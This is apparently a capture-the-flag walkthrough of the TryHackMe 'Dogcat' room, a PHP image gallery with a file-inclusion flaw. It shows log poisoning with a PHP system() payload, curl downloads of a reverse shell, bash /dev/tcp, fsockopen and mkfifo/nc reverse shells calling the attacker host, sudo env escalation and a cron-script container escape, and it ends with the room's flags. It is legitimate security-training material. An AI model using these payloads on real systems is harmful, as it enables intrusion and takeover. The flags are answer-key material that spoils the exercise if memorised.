# Task 1 Dogcat
----

>>I made this website for viewing cat and dog images with PHP. If you're feeling down, come look at some dogs/cats! 

>>This machine may take a few minutes to fully start up.

## SCANNING

```bash
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nmap -sC -sV 10.10.118.7
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-21 09:49 EST
Nmap scan report for 10.10.118.7
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: dogcat
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.27 seconds
```

## FINDING THE FLAW

```bash
# This has a LFI vulnerability so using "php://filter/convert.base64-encode/resource=dog" this payload to get : http://10.10.118.7/?view=php://filter/convert.base64-encode/resource=dog
Here you go!PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K 

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ echo -n 'PGltZyBzcmM9ImRvZ3MvPD9waHAgZWNobyByYW5kKDEsIDEwKTsgPz4uanBnIiAvPg0K' | base64 -d 
<img src="dogs/<?php echo rand(1, 10); ?>.jpg" />

# Using this "http://10.10.118.7/?view=php://filter/convert.base64-encode/resource=dog/../index"

Here you go!PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg== 
                                                                                                                             
┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ echo -n 'PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==' | base64 -d
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
            $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
            
# Using this "http://10.10.118.7/?view=dog/../../../../etc/passwd&ext="

root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:MailingListManager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:GnatsBug-ReportingSystem(admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin 

# Trying this method 

# Request

GET /?view=dog/../../../../var/log/apache2/access.log&ext= HTTP/1.1
Host: 10.10.178.16
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1

# Response

Here you go!10.9.2.193 - - [23/Feb/2022:15:24:24 +0000] "GET / HTTP/1.1" 200 537 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.9.2.193 - - [23/Feb/2022:15:24:25 +0000] "GET /style.css HTTP/1.1" 200 698 "http://10.10.178.16/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.9.2.193 - - [23/Feb/2022:15:24:25 +0000] "GET /favicon.ico HTTP/1.1" 404 491 "http://10.10.178.16/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.9.2.193 - - [23/Feb/2022:15:24:51 +0000] "GET /?view=dog HTTP/1.1" 200 564 "http://10.10.178.16/" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [23/Feb/2022:15:24:52 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.9.2.193 - - [23/Feb/2022:15:24:52 +0000] "GET /dogs/8.jpg HTTP/1.1" 200 52967 "http://10.10.178.16/?view=dog" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.9.2.193 - - [23/Feb/2022:15:25:17 +0000] "GET /?view=dog/../../../../etc/passwd&ext= HTTP/1.1" 200 883 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [23/Feb/2022:15:25:28 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [23/Feb/2022:15:26:15 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.9.2.193 - - [23/Feb/2022:15:26:39 +0000] "GET /?view=dog/../../../../bash%20-i%20%3E&%20/dev/tcp/10.9.2.193/7007%200%3E&1&ext= HTTP/1.1" 200 707 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [23/Feb/2022:15:26:54 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.9.2.193 - - [23/Feb/2022:15:26:57 +0000] "GET /?view=dog/../../bash%20-i%20%3E&%20/dev/tcp/10.9.2.193/7007%200%3E&1&ext= HTTP/1.1" 200 707 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.9.2.193 - - [23/Feb/2022:15:27:04 +0000] "GET /?view=dog/../../bash%20-i%20%3E&%20/dev/tcp/10.9.2.193/7007%200%3E&1&ext= HTTP/1.1" 200 707 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [23/Feb/2022:15:27:34 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.9.2.193 - - [23/Feb/2022:15:28:10 +0000] "GET /?view=dog/../../php%20-r%20%27$sock=fsockopen(%2210.9.2.193%22,7007);exec(%22/bin/sh%20-i%20%3C&3%20%3E&3%202%3E&3%22);%27&ext= HTTP/1.1" 200 757 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [23/Feb/2022:15:28:13 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.9.2.193 - - [23/Feb/2022:15:28:19 +0000] "GET /?view=dog/../../../../php%20-r%20%27$sock=fsockopen(%2210.9.2.193%22,7007);exec(%22/bin/sh%20-i%20%3C&3%20%3E&3%202%3E&3%22);%27&ext= HTTP/1.1" 200 758 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [23/Feb/2022:15:28:49 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [23/Feb/2022:15:29:26 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.9.2.193 - - [23/Feb/2022:15:29:47 +0000] "GET /?view=dog/../../../../proc/self/environ&ext= HTTP/1.1" 200 703 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [23/Feb/2022:15:30:04 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.9.2.193 - - [23/Feb/2022:15:30:09 +0000] "GET /?view=dog/../../../../dog/../../../../etc/passwd&ext= HTTP/1.1" 200 883 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.9.2.193 - - [23/Feb/2022:15:30:23 +0000] "GET /?view=dog/../../../../dog/../../../../proc/self/environ&ext= HTTP/1.1" 200 706 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [23/Feb/2022:15:30:42 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [23/Feb/2022:15:31:19 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [23/Feb/2022:15:31:57 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.9.2.193 - - [23/Feb/2022:15:32:24 +0000] "GET /?view=dog/../../../../dog/../../../../etc/passwd&ext= HTTP/1.1" 200 846 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.9.2.193 - - [23/Feb/2022:15:32:34 +0000] "GET /?view=dog/../../../../etc/passwd&ext= HTTP/1.1" 200 846 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [23/Feb/2022:15:32:35 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [23/Feb/2022:15:33:12 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [23/Feb/2022:15:33:49 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [23/Feb/2022:15:34:27 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.9.2.193 - - [23/Feb/2022:15:34:48 +0000] "GET /?view=dog/etc/passwd&ext= HTTP/1.1" 200 663 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.9.2.193 - - [23/Feb/2022:15:34:56 +0000] "GET /?view=dog/../etc/passwd&ext= HTTP/1.1" 200 662 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [23/Feb/2022:15:35:05 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.9.2.193 - - [23/Feb/2022:15:35:34 +0000] "GET /?view=dog/../../etc/passwd&ext= HTTP/1.1" 200 666 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [23/Feb/2022:15:35:36 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [23/Feb/2022:15:36:06 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.9.2.193 - - [23/Feb/2022:15:36:08 +0000] "GET /?view=dog/../../proc/self/environ&ext= HTTP/1.1" 200 670 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
10.9.2.193 - - [23/Feb/2022:15:36:29 +0000] "GET /?view=dog/../../proc/self/environ&cmd=ls&ext= HTTP/1.1" 200 670 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
127.0.0.1 - - [23/Feb/2022:15:36:36 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [23/Feb/2022:15:37:07 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
127.0.0.1 - - [23/Feb/2022:15:37:37 +0000] "GET / HTTP/1.1" 200 615 "-" "curl/7.64.0"
10.9.2.193 - - [23/Feb/2022:15:37:39 +0000] "GET /?view=dog/../../var/log/apache2/access.log&cmd=ls&ext= HTTP/1.1" 200 675 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"

# Using curl to get the code execution

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ curl "http://10.10.178.16" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
            </div>
</body>

</html>

# These is the area were we need to supply the command

<b>Warning</b>:  system(): Cannot execute a blank command in <b>/var/log/apache2/access.log</b> on line <b>82</b><br />
# With that we got our command execution ready

view-source:http://10.10.178.16/?view=dog/../../../../var/log/apache2/access.log&ext=&cmd=pwd

10.9.2.193 - - [23/Feb/2022:15:50:00 +0000] "GET / HTTP/1.1" 200 615 "-" "/var/www/html
```

## GETTING A SHELL 

```bash
# curl the php reverse shell 
view-source:http://10.10.178.16/?view=dog/../../../../var/log/apache2/
access.log&ext=&cmd=curl%20http://10.9.2.193:8000/shell.php%20-o%20shell.php

# Go to this url http://10.10.178.16/shell.php and we got a shell in the docker image

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nc -lvnp 7007            
listening on [any] 7007 ...
connect to [10.9.2.193] from (UNKNOWN) [10.10.178.16] 35684
Linux ac106f450d25 4.15.0-96-generic #97-Ubuntu SMP Wed Apr 1 03:25:46 UTC 2020 x86_64 GNU/Linux
 16:08:41 up 47 min,  0 users,  load average: 0.00, 0.00, 0.08
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ cd /var/www/html
$ ls
cat.php
cats
dog.php
dogs
flag.php
index.php
shell.php
style.css
$ cat flag.php  
<?php
$flag_1 = "THM{Th1s_1s_N0t_4_Catdog_ab67edfa}"
?>
$ cd ..
$ cat flag2_QMW7JvaY2LvK.txt
THM{LF1_t0_RC3_aec3fb}
```

## PRIVILEGE ESCALATION

```bash
$ sudo -l
Matching Defaults entries for www-data on ac106f450d25:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on ac106f450d25:
    (root) NOPASSWD: /usr/bin/env
$ sudo /usr/bin/env /bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
flag3.txt
cat flag3.txt
THM{D1ff3r3nt_3nv1ronments_874112}

# Using this in the backup.sh , because it will run as cronjob we get a shell in the actual machine

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.2.193 8888 >/tmp/f" >> backup.sh

┌[rawbot@pwnbox]─[/home/rawbot]
└╼[★]$ nc -nlvp 8888
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::8888
Ncat: Listening on 0.0.0.0:8888
Ncat: Connection from 10.10.178.16.
Ncat: Connection from 10.10.178.16:36286.
bash: cannot set terminal process group (13166): Inappropriate ioctl for device
bash: no job control in this shell
root@dogcat:~# whoami
whoami
root
root@dogcat:~# hostname 
hostname
dogcat
root@dogcat:~# ls -l
ls -l
total 8
drwxr-xr-x 5 root root 4096 Mar 10 20:52 container
-rw-r--r-- 1 root root   80 Mar 10 19:54 flag4.txt
root@dogcat:~# cat flag4.txt
cat flag4.txt
THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}
```

----

# ANSWER THE QUESTIONS 

1.What is flag 1?
>>THM{Th1s_1s_N0t_4_Catdog_ab67edfa}

2.What is flag 2?
>>THM{LF1_t0_RC3_aec3fb}

3.What is flag 3?
>>THM{D1ff3r3nt_3nv1ronments_874112}

4.What is flag 4?
>>THM{esc4l4tions_on_esc4l4tions_on_esc4l4tions_7a52b17dba6ebb0dc38bc1049bcba02d}

----